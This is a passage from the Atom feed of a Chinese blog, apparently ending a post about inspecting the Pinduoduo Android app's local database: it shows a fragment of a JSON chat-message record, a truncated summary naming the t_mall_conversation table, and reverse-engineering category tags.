quot;parrot_rich_text_with_menu_item&quot;,&quot;to&quot;:&#123;&quot;role&quot;:&quot;user&quot;,&quot;uid&quot;:&quot;5564948642776&quot;&#125;,&quot;ts&quot;:&quot;1579261690&quot;,&quot;type&quot;:0,&quot;unread_count&quot;:1,&quot;user_has_read&quot;:true&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;拼多多数据库&quot;&gt;&lt;a href=&quot;#拼多多数据库&quot; class=&quot;headerlink&quot; title=&quot;拼多多数据库&quot;&gt;&lt;/a&gt;拼多多数据库&lt;/h2&gt;&lt;p&gt;在拼多多数据库中其中的&lt;code&gt;t_mall_conversation&lt;/code&gt;表中的&lt;code&gt;me</summary>
      
    
    
    
    <category term="逆向" scheme="https://vxer-lee.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="Android逆向" scheme="https://vxer-lee.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
